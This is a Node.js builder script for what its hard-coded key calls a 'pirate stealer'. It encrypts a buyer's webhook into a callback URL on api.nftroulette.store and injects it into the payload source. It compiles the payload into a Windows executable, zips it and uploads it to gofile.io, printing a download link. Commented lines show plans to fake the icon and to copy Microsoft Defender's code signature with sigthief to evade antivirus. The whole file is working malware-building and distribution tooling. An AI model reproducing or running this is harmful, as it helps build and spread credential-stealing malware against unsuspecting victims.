const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const FormData = require("form-data");
const axios = require("axios");
const archiver = require('archiver');
const crypto = require('crypto');

async function upload(path) {
    const server = await getServer();
    const link = await uploadFile(path, server);
    return link
}

async function getServer() {
    const res = await axios({
        url: `https://apiv2.gofile.io/getServer`,
        method: "GET",
        headers: {
            accept: "*/*",
            "accept-language": "en-US,en;",
            "cache-control": "no-cache",
            pragma: "no-cache",
            referrer: "https://gofile.io/uploadFiles",
            mode: "cors",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
            dnt: 1,
            origin: "https://gofile.io"
        },
    });

    if (res.data.status !== "ok") {
        throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.server;
}

async function uploadFile(path, server) {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(path))

    const res = await axios({
        url: `https://${server}.gofile.io/uploadFile`,
        method: "POST",
        headers: {
            accept: "*/*",
            "accept-language": "en-US,en;",
            "cache-control": "no-cache",
            pragma: "no-cache",
            referrer: "https://gofile.io/uploadFiles",
            mode: "cors",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
            dnt: 1,
            origin: "https://gofile.io",
            ...formData.getHeaders(),
        },
        'maxContentLength': Infinity,
        'maxBodyLength': Infinity,
        referrer: "https://gofile.io/uploadFiles",
        data: formData,
    });

    if (res.data.status !== "ok") {
        throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.downloadPage;
}

const args = process.argv.slice(2)

if (args.length != 2) {
    console.log("ERROR: Invalid exe name detected *(retry without space)*")
    return
}

const key = "stanleySMODSPIRATESTEALER0109222"

function encrypt(plainText) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let cipherText;
    try {
        cipherText = cipher.update(plainText, 'utf8', 'hex');
        cipherText += cipher.final('hex');
        cipherText = iv.toString('hex') + cipherText
    } catch (e) {
        cipherText = null;
    }
    return cipherText;
}

async function start() {
    const encryptedWebhook = "http://api.nftroulette.store:2086/webhooks/" + encrypt(args[0]);
    console.log(encryptedWebhook)

    try {
        fs.rmSync("./src/index.js")
        fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace("%APIURL%", encryptedWebhook))
        fs.copyFileSync("./index.js", "./src/index.js")
        fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace(encryptedWebhook, "%APIURL%"))
    } catch (e) {console.log(e)} 

        //await exec(`wine rcedit-x64.exe --set-icon ${args[0]} /root/.pkg-cache/v3.4/built-v16.16.0-win-x64`)
        await exec(`cd src && pkg -C GZip -o ${args[1]}.exe -t node18-win-x64 .`)

        fs.copyFileSync(`./src/${args[1]}.exe`, `${args[1]}.exe`)
        fs.rmSync(`./src/${args[1]}.exe`);

        //await exec(`python3 sigthief.py -i MsMpEng.exe -t client.exe -o ${args[1]}.exe`)
        
        const output = fs.createWriteStream(__dirname + '/' + args[1] + '.zip');
        const archive = archiver('zip', {
            zlib: { level: 9 }
        });

        archive.pipe(output);
        const file = process.cwd() + "/" + args[1] + ".exe";
        archive.append(fs.createReadStream(file), { name: args[1] + ".exe" });
        await archive.finalize();
        const link = await upload(process.cwd() + "/" + args[1] + ".zip");
        fs.appendFileSync("link.txt", link);
        fs.rmSync(`${args[1]}.zip`);
        fs.rmSync(`${args[1]}.exe`);
}
start()
